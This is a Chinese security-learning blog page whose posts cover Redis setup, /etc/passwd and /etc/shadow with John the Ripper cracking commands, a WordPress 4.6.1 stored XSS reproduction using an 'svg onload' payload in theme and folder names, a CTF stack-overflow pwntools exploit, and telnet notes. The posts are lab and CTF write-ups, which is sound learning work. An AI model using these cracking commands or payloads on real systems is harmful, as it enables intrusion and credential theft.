<!DOCTYPE HTML>
<html>
<head>
  <meta charset="utf-8">
  
  <title>fanson&#39;s Blog</title>

  
  <meta name="author" content="fanson">
  

  

  

  <meta id="viewport" name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=no, minimal-ui">
  <meta name="apple-mobile-web-app-capable" content="yes">
  <meta name="apple-mobile-web-app-status-bar-style" content="black">

  

  <meta property="og:site_name" content="fanson&#39;s Blog"/>

  
  <meta property="og:image" content="/favicon.ico"/>
  

  <link href="/favicon.ico" rel="icon">
  <link rel="alternate" href="/atom.xml" title="fanson&#39;s Blog" type="application/atom+xml">
  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
</head>


<body>
<div class="blog">
  <div class="content">

    <header>
  <div class="site-branding">
    <h1 class="site-title">
      <a href="/">fanson&#39;s Blog</a>
    </h1>
    <p class="site-description"></p>
  </div>
  <nav class="site-navigation">
    <ul>
      
        <li><a href="/">Home</a></li>
      
        <li><a href="/archives">Archives</a></li>
      
    </ul>
  </nav>
</header>

    <main class="site-main posts-loop">
    
  <article>

  
    
    <h3 class="article-title"><a href="/2019/03/27/Redis未授权访问漏洞复现/"><span>Redis未授权访问漏洞复现及利用总结</span></a></h3>
    
  

  <div class="article-top-meta">
    <span class="posted-on">
      <a href="/2019/03/27/Redis未授权访问漏洞复现/" rel="bookmark">
        <time class="entry-date published" datetime="2019-03-27T15:09:29.000Z">
          2019-03-27
        </time>
      </a>
    </span>
  </div>


  

  <div class="article-content">
    <div class="entry">
      
        <blockquote>
</blockquote>
<blockquote>
<p>斯人若彩虹，遇上方知有</p>
</blockquote>
<p><strong><em>0x01 Redis介绍</em></strong></p>
<p><strong>Redis</strong>是一个使用ANSI C编写的开源、支持网络、基于内存、可选持久性的键值(key-value)对存储 (store) 数据库。（基于 BSD 许可的，高级键值 (key-value) 缓存 (cache) 和存储 (store) 系统。）从2015年6月开始，Redis的开发由<a href="https://zh.wikipedia.org/w/index.php?title=Redis_Labs&amp;action=edit&amp;redlink=1" target="_blank" rel="noopener">Redis Labs</a>赞助，而2013年5月至2015年6月期间，其开发由<a href="https://zh.wikipedia.org/wiki/Pivotal" target="_blank" rel="noopener">Pivotal</a>赞助。)在2013年5月之前，其开发由<a href="https://zh.wikipedia.org/wiki/VMware" target="_blank" rel="noopener">VMware</a>赞助。根据月度排行网站DB-Engines.com的数据显示，Redis是最流行的键值对存储数据库。由于 Redis 的键包括 string，hash，list，set，sorted set，bitmap 和 hyperloglog，所以常常被称为数据结构服务器。</p>
<p><code>Redis</code>因配置不当可以未授权访问。攻击者无需认证访问到内部数据，可导致敏感信息泄露，也可以恶意执行<code>flushall</code>来清空所有数据。</p>
<p><strong><em>0x02 环境搭建</em></strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#靶机：CentOS7.0</span><br><span class="line">#CentOS安装redis</span><br><span class="line">wget http://download.redis.io/releases/redis-3.2.0.tar.gz</span><br><span class="line">tar xzf redis-3.2.0.tar.gz</span><br><span class="line">cd redis-3.2.0</span><br><span class="line">make</span><br></pre></td></tr></table></figure>
<p><strong><em>0x03 漏洞复现</em></strong></p>
<p><strong><em>0x04 填坑过程</em></strong></p>
<p>安装Redis-3.2.0时报错：</p>
<p>make[1]: Entering directory `/home/fanson/redis-3.2.0/src’<br>​    CC adlist.o<br>In file included from adlist.c:34:0:<br>zmalloc.h:50:31: fatal error: jemalloc/jemalloc.h: No such file or directory</p>
<p>include &lt;jemalloc/jemalloc.h&gt;</p>
<p>compilation terminated.<br>make[1]: <strong><em> [adlist.o] Error 1<br>make[1]: Leaving directory `/home/fanson/redis-3.2.0/src’<br>make: </em></strong> [all] Error 2</p>
<p>解决方法</p>
<p>Allocator  </p>
<p>Selecting a non-default memory allocator when building Redis is done by setting  the <code>MALLOC</code> environment variable. Redis is compiled and linked against libc malloc by default, with the exception of jemalloc being the default on Linux  systems. This default was picked because jemalloc has proven to have fewer<br>fragmentation problems than libc malloc.  To force compiling against libc malloc, use:  </p>
<pre><code>make MALLOC=libc  
</code></pre><p>To compile against jemalloc on Mac OS X systems, use:  </p>
<pre><code>make MALLOC=jemalloc
</code></pre><p><strong><em>0x05 参考文献</em></strong></p>
<p><a href="https://xz.aliyun.com/t/256" target="_blank" rel="noopener">https://xz.aliyun.com/t/256</a></p>
<p><a href="https://www.anquanke.com/post/id/170360" target="_blank" rel="noopener">https://www.anquanke.com/post/id/170360</a></p>
<p><a href="https://uknowsec.cn/posts/notes/Redis%E5%9C%A8Windows%E7%8E%AF%E5%A2%83%E4%B8%8BGetshell.html" target="_blank" rel="noopener">https://uknowsec.cn/posts/notes/Redis%E5%9C%A8Windows%E7%8E%AF%E5%A2%83%E4%B8%8BGetshell.html</a></p>
<p><a href="http://redisinaction.com/preview/chapter1.html" target="_blank" rel="noopener">http://redisinaction.com/preview/chapter1.html</a></p>

      
    </div>

  </div>

  <div class="article-footer">
    <div class="article-meta pull-left">

    

    
    

    <span class="post-tags">
      <i class="icon-tags"></i>
        <a href="/tags/渗透测试/">渗透测试</a>
    </span>
    

    </div>

    
  </div>
</article>



  <article>

  
    
    <h3 class="article-title"><a href="/2019/03/26/linux下的-etc-password-etc-shadow/"><span>linux下的/etc/passwd&amp;&amp;/etc/shadow</span></a></h3>
    
  

  <div class="article-top-meta">
    <span class="posted-on">
      <a href="/2019/03/26/linux下的-etc-password-etc-shadow/" rel="bookmark">
        <time class="entry-date published" datetime="2019-03-26T14:27:48.000Z">
          2019-03-26
        </time>
      </a>
    </span>
  </div>


  

  <div class="article-content">
    <div class="entry">
      
        <blockquote>
<p>你会不会突然的出现，在街角的咖啡店！</p>
</blockquote>
<p>最近有遇到对<code>/etc/shadow</code>中的密码进行爆破问题，但是却没有成功，之前记得也有过总结这个，却找不到了。无奈就过来再记录下，以免下次查阅！</p>
<p><strong><em>/etc/passwd</em></strong></p>
<p>/etc/passwd是系统识别用户的一个文件，这个文件存放着所有用户账号的信息。其中当然包括账号与密码。当我们以root这个账号登录时，系统首先会查阅 /etc/passwd 文件，看是否有root这个账号，然后确定root的UID，通过UID 来确认用户和身份。</p>
<p>/etc/passwd的文件内容：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">root权限下执行查看</span><br><span class="line">＃ cat /etc/passwd</span><br><span class="line"></span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">daemon:x:1:1:System daemons:/etc:</span><br><span class="line">bin:x:2:2:Owner of system commands:/bin:</span><br><span class="line">sys:x:3:3:Owner of system files:/usr/sys:</span><br><span class="line">adm:x:4:4:System accounting:/usr/adm:</span><br><span class="line">uucp:x:5:5:UUCP administrator:/usr/lib/uucp:</span><br><span class="line">auth:x:7:21:Authentication administrator:/tcb/files/auth:</span><br><span class="line">cron:x:9:16:Cron daemon:/usr/spool/cron:</span><br><span class="line">listen:x:37:4:Network daemon:/usr/net/nls:</span><br><span class="line">lp:x:71:18:Printer administrator:/usr/spool/lp:</span><br><span class="line">sam:x:200:50:Sam san:/usr/sam:/bin/sh</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">用户名:密码:用户ID:组ID:用户描述:主目录:shell</span><br></pre></td></tr></table></figure>
<p>系统中有一类用户称为伪用户（<code>psuedo users</code>），这些用户在<code>/etc/passwd</code>文件中也占有一条记录，但是不能登录，因为它们的登录<code>Shell</code>为空。它们的存在主要是方便系统管理，满足相应的系统进程对文件属主的要求。常见的伪用户如下：</p>
<table>
<thead>
<tr>
<th><strong>bin</strong></th>
<th><strong>拥有可执行的用户命令文件</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td><strong>sys</strong></td>
<td><strong>拥有系统文件</strong></td>
</tr>
<tr>
<td><strong>adm</strong></td>
<td><strong>拥有帐户文件</strong></td>
</tr>
<tr>
<td><strong>uucp</strong></td>
<td><strong>UUCP使用 </strong></td>
</tr>
<tr>
<td><strong>lp</strong></td>
<td><strong>lp或lpd子系统使用</strong></td>
</tr>
<tr>
<td><strong>nobody</strong></td>
<td><strong>NFS使用</strong></td>
</tr>
</tbody>
</table>
<p>除了上面列出的伪用户外，还有许多标准的伪用户，例如：audit, cron, mail, usenet等，它们也都各自为相关的进程和文件所需要。</p>
<p><strong><em>/etc/shadow</em></strong></p>
<p>由于/etc/passwd文件是所有用户都可读的，如果用户的密码太简单或规律比较明显的话，一台普通的计算机就能够很容易地将它破解，因此对安全性要求较高的Linux系统都把加密后的口令字分离出来，单独存放在一个文件中，这个文件是/etc/shadow文件。 有超级用户才拥有该文件读权限，这就保证了用户密码的安全性。</p>
<p>【<code>/etc/shadow中的记录行与/etc/passwd中的一一对应，它由pwconv命令根据/etc/passwd中的数据自动产生</code>】</p>
<p>它的文件格式与/etc/passwd类似，具体如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">＃ cat /etc/shadow</span><br><span class="line"></span><br><span class="line">root:Dnakfw28zf38w:8764:0:168:7:::</span><br><span class="line">daemon:*::0:0::::</span><br><span class="line">bin:*::0:0::::</span><br><span class="line">sys:*::0:0::::</span><br><span class="line">adm:*::0:0::::</span><br><span class="line">uucp:*::0:0::::</span><br><span class="line">nuucp:*::0:0::::</span><br><span class="line">auth:*::0:0::::</span><br><span class="line">cron:*::0:0::::</span><br><span class="line">listen:*::0:0::::</span><br><span class="line">lp:*::0:0::::</span><br><span class="line">sam:EkdiSECLWPdSa:9740:0:0::::</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root:$36zQdAHKBxYr1lSPP26x1IhP6bOAigu7qO1ENtsyfxtU6hHvMdQMrgfxKhJ/ltkgAYwqA45ps/2HTF6saI/6gzLe7sF6kr1:16596:0:99999:6:::</span><br><span class="line">登录名:加密口令:最后一次修改时间:最小时间间隔:最大时间间隔:警告时间:不活动时间:失效时间:标志</span><br></pre></td></tr></table></figure>
<p>后三个一般是没有的</p>
<p><strong>“加密口令”字段存放的是加密[MD5,SHA-256,SHA-512]后的用户口令字，长度为13个字符。如果为空，则对应用户没有口令，登录时不需要口令；如果含有不属于集合 { ./0-9A-Za-z }中的字符，则对应的用户不能登录。</strong></p>
<p><strong><em>密码爆破</em></strong></p>
<p>最后介绍下如何爆破，我们先来了解下<code>linux</code>系统密码加密的原理：</p>
<p>密文由3部分组成，以”$”分隔，第一部分为ID(用来表示加密的方法)，第二部分为盐值，第三部分为加密密文</p>
<table>
<thead>
<tr>
<th>ID</th>
<th>加密方法</th>
</tr>
</thead>
<tbody>
<tr>
<td>1</td>
<td>MD5</td>
</tr>
<tr>
<td>5</td>
<td>SHA-256</td>
</tr>
<tr>
<td>6</td>
<td>SHA-512</td>
</tr>
</tbody>
</table>
<p>盐值：盐值就是使用随机字符码混合密码加密算法所产生的密码，作用就是即使是同一个密码，使用同一种加密方式，所产生的密文值也不同 。</p>
<p>工具爆破：<code>John the Ripper (“JtR”)</code> 是一个非常有用的工具。这是一个快速的密码破解器，适用于<code>Windows</code>和许多<code>Linux</code>系统。它具有很多功能，对于很多密码破解均有奇效。<code>JtR</code>破解的文件必须有特定的格式。要转换passwd和shadow文件，我们需要利用/usr/sbin/unshade可执行文件。这需要超级用户权限才能执行。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo /usr/sbin/unshadow /etc/passwd /etc/shadow &gt; ~/passwords.txt</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/sbin/john --wordlist=/usr/share/wordlists/rockyou.txt ~/passwords.txt</span><br></pre></td></tr></table></figure>
<p>即可完成爆破。</p>
<p>该工具的详细是使用功能可见<a href="https://xz.aliyun.com/t/3958" target="_blank" rel="noopener">https://xz.aliyun.com/t/3958</a></p>

      
    </div>

  </div>

  <div class="article-footer">
    <div class="article-meta pull-left">

    

    
    

    <span class="post-tags">
      <i class="icon-tags"></i>
        <a href="/tags/linux/">linux</a>
    </span>
    

    </div>

    
  </div>
</article>



  <article>

  
    
    <h3 class="article-title"><a href="/2019/03/23/Wordpress-4-6-1-Stored-XSS-Via-Theme-File/"><span>Wordpress &lt;= 4.6.1 Stored XSS Via Theme File</span></a></h3>
    
  

  <div class="article-top-meta">
    <span class="posted-on">
      <a href="/2019/03/23/Wordpress-4-6-1-Stored-XSS-Via-Theme-File/" rel="bookmark">
        <time class="entry-date published" datetime="2019-03-23T10:16:44.000Z">
          2019-03-23
        </time>
      </a>
    </span>
  </div>


  

  <div class="article-content">
    <div class="entry">
      
        <p><em>Wordpress &lt;= 4.6.1 Stored XSS 漏洞复现</em></p>
<blockquote>
<p>我多想再见你<br>哪怕匆匆一眼</p>
</blockquote>
<p>​    发现自己对web漏洞的一些点理解的还是不够深。所以准备复现一波web漏洞，加深自己对一些点的理解深度和巩固下知识！</p>
<p>0x00 漏洞概述</p>
<p>​    首先，我们来了解下<code>wordresss</code>，<a href="https://wordpress.org/" target="_blank" rel="noopener">WordPress</a>是一个以<code>PHP</code>和<code>MySQL</code>为平台的自由开源的博客软件和内容管理系统，<code>WordPress</code>具有插件架构和模板系统，截至2018年4月，排名前1000万的网站超过30.6%使用<code>WordPress</code><a href="https://zh.wikipedia.org/wiki/WordPress#cite_note-6" target="_blank" rel="noopener">[1]</a>。<code>WordPress</code>是最受欢迎的网站<a href="https://zh.wikipedia.org/wiki/%E5%86%85%E5%AE%B9%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F" target="_blank" rel="noopener">内容管理系统</a>，<code>WordPress</code>在最着名的网络发布阶段中脱颖而出。如今，它被使用在超过7000万个站点上。</p>
<p>​    <code>WordPress</code>用户可以安装和切换主题。主题可让用户不改变博客内容和结构的情况下更改界面和<code>WordPress</code>站点的功能。主题可以在<code>WordPress</code>的“外观”管理工具中安装，或者通过<code>FTP</code>上传至主题文件夹。也可以通过编辑主题中的<code>PHP</code>和<code>HTML</code>代码自定义主题。而漏洞是一个后台存储型<code>XSS</code>漏洞，可以通过上传恶意构造的主题文件来触发。【上述内容来自维基百科】</p>
<p>0x01 环境搭建</p>
<p>​    本来这个环境是很容易的搭的啊，但刚开始就是一直报错，到最后一直改了又改，最终还是</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker: Error response from daemon: Cannot link to a non running container</span><br></pre></td></tr></table></figure>
<p>到最后一直改了又改，最终还是报错，无奈重新搭建，果然重建是第一生产力。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">docker exec -it 0027a12dab6d /bin/bash  </span><br><span class="line">vim /etc/mysql/conf.d/mysql.cnf</span><br><span class="line">Redhat停止防火墙：service iptables stop</span><br><span class="line">Ubuntu停止防火墙：ufw disable</span><br></pre></td></tr></table></figure>
<p>最后终于搭建完成，命令如下</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">docker pull wordpress:4.6.1</span><br><span class="line">docker pull mysql</span><br><span class="line">docker run --name wp-mysql -e MYSQL_ROOT_PASSWORD=fans0n -d mysql</span><br><span class="line">docker run --name wp-wordpress --link wp-mysql:mysql -p 8080:80 -d wordpress:4.6.1</span><br></pre></td></tr></table></figure>
<p>0x02 漏洞复现</p>
<p>​    首先，我们先下载一个主题</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wget https://downloads.wordpress.org/theme/illdy.1.0.29.zip</span><br><span class="line">unzip -x illdy.1.0.29.zip</span><br></pre></td></tr></table></figure>
<p>​    并且对其<code>illdy/style.css</code>进行如下更改：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/*</span><br><span class="line">Theme Name: &lt;svg onload=alert(1234)&gt;</span><br><span class="line">*/</span><br></pre></td></tr></table></figure>
<p><img src="/2019/03/23/Wordpress-4-6-1-Stored-XSS-Via-Theme-File/theme-n.PNG" alt=""></p>
<p>​    接着更改文件夹名字再打包：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mv illdy &quot;&lt;svg onload=alert(fans0n)&gt;&quot;</span><br><span class="line">zip -r theme.zip &quot;&lt;svg onload=alert(fans0n)&gt;&quot;</span><br></pre></td></tr></table></figure>
<p>​    <img src="/2019/03/23/Wordpress-4-6-1-Stored-XSS-Via-Theme-File/theme.PNG" alt=""><img src="/2019/03/23/Wordpress-4-6-1-Stored-XSS-Via-Theme-File/themeChange.PNG" alt=""></p>
<p>​    构造好之后我们登录后台上传该主题文件，同时开始动态调试。</p>

      
    </div>

  </div>

  <div class="article-footer">
    <div class="article-meta pull-left">

    

    
    

    <span class="post-tags">
      <i class="icon-tags"></i>
        <a href="/tags/websec/">websec</a>
    </span>
    

    </div>

    
  </div>
</article>



  <article>

  
    
    <h3 class="article-title"><a href="/2019/03/22/ctf-姿势/"><span>ctf-姿势</span></a></h3>
    
  

  <div class="article-top-meta">
    <span class="posted-on">
      <a href="/2019/03/22/ctf-姿势/" rel="bookmark">
        <time class="entry-date published" datetime="2019-03-22T14:03:22.000Z">
          2019-03-22
        </time>
      </a>
    </span>
  </div>


  

  <div class="article-content">
    <div class="entry">
      
        
      
    </div>

  </div>

  <div class="article-footer">
    <div class="article-meta pull-left">

    

    

    </div>

    
  </div>
</article>



  <article>

  
    
    <h3 class="article-title"><a href="/2019/03/03/Pwn/"><span>Pwn</span></a></h3>
    
  

  <div class="article-top-meta">
    <span class="posted-on">
      <a href="/2019/03/03/Pwn/" rel="bookmark">
        <time class="entry-date published" datetime="2019-03-03T11:56:05.000Z">
          2019-03-03
        </time>
      </a>
    </span>
  </div>


  

  <div class="article-content">
    <div class="entry">
      
        <p>周末看到了这道题，学习记录下来！</p>
<p>首先我们先来看源代码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init</span><span class="params">()</span></span>&#123;</span><br><span class="line">    setvbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>, _IOLBF, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">welcome</span><span class="params">()</span></span>&#123;</span><br><span class="line">    write(<span class="number">1</span>, <span class="string">"Welcome to zsctf!\n"</span>, <span class="number">21</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">vuln</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buffer[<span class="number">8</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    read(<span class="number">0</span>, buffer, <span class="number">0x40</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    init();</span><br><span class="line">    welcome();</span><br><span class="line">    vuln();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>通过看源码，能明显的看出，read()函数处存在明显栈溢出，接着我们来运行下程序，熟悉程序的各个功能。</p>
<p><img src="/2019/03/03/Pwn/1.PNG" alt=""></p>
<p>检查该程序打开的保护措施</p>
<p><img src="/2019/03/03/Pwn/3.PNG" alt=""></p>
<p>NX保护关闭，就更容易利用了</p>
<p>我们就可以来捋下大致的利用思路，通过read()函数，把shellcode读进去BBS段</p>
<p>接下来，我们就可以操作了；</p>
<p>用cyclic 100生成100个字符来覆盖返回地址，并将这些字符输入给程序来得到无效地址</p>
<p><img src="/2019/03/03/Pwn/5.PNG" alt=""></p>
<p>结合cyclic -l  无效地址来得到返回地址，并将shellcode放入该返回地址处</p>
<p><img src="/2019/03/03/Pwn/6.PNG" alt=""></p>
<p><img src="/2019/03/03/Pwn/8.PNG" alt=""></p>
<p>通过ida找到bbs段的地址</p>
<p><img src="/2019/03/03/Pwn/9.PNG" alt=""></p>
<p>结合pwntools，构造rop，写exp</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">bss_add = <span class="number">0x804A024</span>   <span class="comment">#通过ida找到的bbs段的地址</span></span><br><span class="line">proc = <span class="string">'./static'</span></span><br><span class="line">context.binary = proc</span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line">p = process(proc)</span><br><span class="line">p.recvuntil(<span class="string">"Welcome to zsctf!"</span>)</span><br><span class="line">rop = ROP(proc)</span><br><span class="line">rop.read(<span class="number">0</span>,bss_add+<span class="number">0x100</span>,len(shellcode))</span><br><span class="line">rop.call(bss_add+<span class="number">0x100</span>)</span><br><span class="line">p.send(<span class="string">'a'</span>*<span class="number">20</span> + str(rop))</span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line">p.send(shellcode)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p>最终成功获得shell</p>
<p><img src="/2019/03/03/Pwn/7.PNG" alt=""></p>
<p>本文为听b站莫笑老师的笔记记录吧</p>

      
    </div>

  </div>

  <div class="article-footer">
    <div class="article-meta pull-left">

    

    
    

    <span class="post-tags">
      <i class="icon-tags"></i>
        <a href="/tags/ctf/">ctf</a>
    </span>
    

    </div>

    
  </div>
</article>



  <article>

  
    
    <h3 class="article-title"><a href="/2019/01/06/一些常用服务的linux-command/"><span>一些常用服务的linux-command</span></a></h3>
    
  

  <div class="article-top-meta">
    <span class="posted-on">
      <a href="/2019/01/06/一些常用服务的linux-command/" rel="bookmark">
        <time class="entry-date published" datetime="2019-01-06T10:22:30.000Z">
          2019-01-06
        </time>
      </a>
    </span>
  </div>


  

  <div class="article-content">
    <div class="entry">
      
        <h1 id="telnet"><a href="#telnet" class="headerlink" title="telnet"></a>telnet</h1><p>登录远程主机和管理(测试ip端口是否连通) </p>
<p><strong>telnet命令</strong> 用于登录远程主机，对远程主机进行管理。telnet因为采用明文传送报文，安全性不好，很多Linux服务器都不开放telnet服务，而改用更安全的ssh方式了。但仍然有很多别的系统可能采用了telnet方式来提供远程登录，因此弄清楚telnet客户端的使用方式仍是很有必要的。</p>
<p><strong>语法：</strong></p>
<p>telnet(选项)(参数) </p>
<p><strong>选项</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">-8：允许使用8位字符资料，包括输入与输出；</span><br><span class="line">-a：尝试自动登入远端系统；</span><br><span class="line">-b&lt;主机别名&gt;：使用别名指定远端主机名称；</span><br><span class="line">-c：不读取用户专属目录里的.telnetrc文件；</span><br><span class="line">-d：启动排错模式；</span><br><span class="line">-e&lt;脱离字符&gt;：设置脱离字符；</span><br><span class="line">-E：滤除脱离字符；</span><br><span class="line">-f：此参数的效果和指定&quot;-F&quot;参数相同；</span><br><span class="line">-F：使用Kerberos V5认证时，加上此参数可把本地主机的认证数据上传到远端主机；</span><br><span class="line">-k&lt;域名&gt;：使用Kerberos认证时，加上此参数让远端主机采用指定的领域名，而非该主机的域名；</span><br><span class="line">-K：不自动登入远端主机；</span><br><span class="line">-l&lt;用户名称&gt;：指定要登入远端主机的用户名称；</span><br><span class="line">-L：允许输出8位字符资料；</span><br><span class="line">-n&lt;记录文件&gt;：指定文件记录相关信息；</span><br><span class="line">-r：使用类似rlogin指令的用户界面；</span><br><span class="line">-S&lt;服务类型&gt;：设置telnet连线所需的ip TOS信息；</span><br><span class="line">-x：假设主机有支持数据加密的功能，就使用它；</span><br><span class="line">-X&lt;认证形态&gt;：关闭指定的认证形态。</span><br></pre></td></tr></table></figure>
<p><strong>参数</strong></p>
<ul>
<li>远程主机：指定要登录进行管理的远程主机；</li>
<li>端口：指定TELNET协议使用的端口号。</li>
</ul>
<p><strong>实例</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$ telnet 192.168.2.10</span><br><span class="line">Trying 192.168.2.10...</span><br><span class="line">Connected to 192.168.2.10 (192.168.2.10).</span><br><span class="line">Escape character is &apos;^]&apos;.</span><br><span class="line"></span><br><span class="line">    localhost (Linux release 2.6.18-274.18.1.el5 #1 SMP Thu Feb 9 12:45:44 EST 2012) (1)</span><br><span class="line"></span><br><span class="line">login: root</span><br><span class="line">Password:</span><br><span class="line">Login incorrect</span><br></pre></td></tr></table></figure>
<p>一般情况下不允许root从远程登录，可以先用普通账号登录，然后再用su -切到root用户。 </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ telnet 192.168.188.132</span><br><span class="line">Trying 192.168.188.132...</span><br><span class="line">telnet: connect to address 192.168.188.132: Connection refused</span><br><span class="line">telnet: Unable to connect to remote host</span><br></pre></td></tr></table></figure>
<p>处理这种情况方法：</p>
<ol>
<li><p>确认ip地址是否正确？</p>
</li>
<li><p>确认ip地址对应的主机是否已经开机？</p>
</li>
<li><p>如果主机已经启动，确认路由设置是否设置正确？（使用route命令查看）</p>
</li>
<li><p>如果主机已经启动，确认主机上是否开启了telnet服务？（使用netstat命令查看，TCP的23端口是否有LISTEN状态的行）</p>
</li>
<li><p>如果主机已经启动telnet服务，确认防火墙是否放开了23端口的访问？（使用iptables-save查看）</p>
<p><strong>启动telnet服务</strong></p>
</li>
</ol>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service xinetd restart</span><br></pre></td></tr></table></figure>
<p>配置参数，通常的配置如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">service telnet</span><br><span class="line">&#123;</span><br><span class="line">    disable = no #启用</span><br><span class="line">    flags = REUSE #socket可重用</span><br><span class="line">    socket_type = stream #连接方式为TCP</span><br><span class="line">    wait = no #为每个请求启动一个进程</span><br><span class="line">    user = root #启动服务的用户为root</span><br><span class="line">    server = /usr/sbin/in.telnetd #要激活的进程</span><br><span class="line">    log_on_failure += USERID #登录失败时记录登录用户名</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
